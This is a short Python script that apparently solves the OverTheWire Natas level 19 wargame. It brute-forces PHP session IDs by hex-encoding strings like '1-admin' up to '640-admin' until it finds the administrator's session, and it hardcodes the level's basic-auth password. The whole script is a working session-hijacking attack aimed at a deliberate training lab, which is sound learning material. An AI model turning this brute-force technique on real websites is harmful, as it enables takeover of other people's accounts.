import requests
import binascii

url = 'http://natas19.natas.labs.overthewire.org/index.php?debug'
natas19_username = 'natas19'
natas19_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

data = {'username': '', 'password': ''}
for i in range(1, 641):
    cookie_text = f'{i}-admin'

    decimal_nums = [ord(ch) for ch in cookie_text]
    sessionid = ''.join([hex(n)[2:] for n in decimal_nums])

    # shorter option:
    # sessionid = binascii.hexlify(cookie_text.encode()).decode()

    cookies = {'PHPSESSID': sessionid}
    r = requests.post(url, data=data, cookies=cookies,
                      auth=(natas19_username, natas19_password))
    if 'regular user' in r.text:
        print(i)
    else:
        print(r.text)
        print(cookies)
        break
